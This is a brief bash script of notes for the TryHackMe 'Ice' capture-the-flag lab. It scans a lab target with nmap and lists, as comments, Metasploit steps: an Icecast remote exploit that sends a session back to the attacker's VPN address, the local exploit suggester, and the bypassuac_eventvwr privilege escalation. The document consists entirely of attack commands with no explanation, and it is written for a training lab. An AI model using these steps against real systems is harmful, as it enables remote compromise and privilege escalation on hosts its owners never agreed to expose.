#!/bin/bash
# Link: https://tryhackme.com/r/room/ice

targetip=10.10.38.186
vpnip=10.2.117.26

sudo nmap -sV -vv $targetip

#Icecast on port 8000

#METASPLOIT
#msfconsole
#search icecast
#use 0
#set RHOSTS $targetip
#set LHOST $vpnip
#run

#ctrl + z
#search suggester
#use 0
#set Session 1
#run

#use exploit/windows/local/bypassuac_eventvwr
#set session 1
#set lhost !vpnip
#run
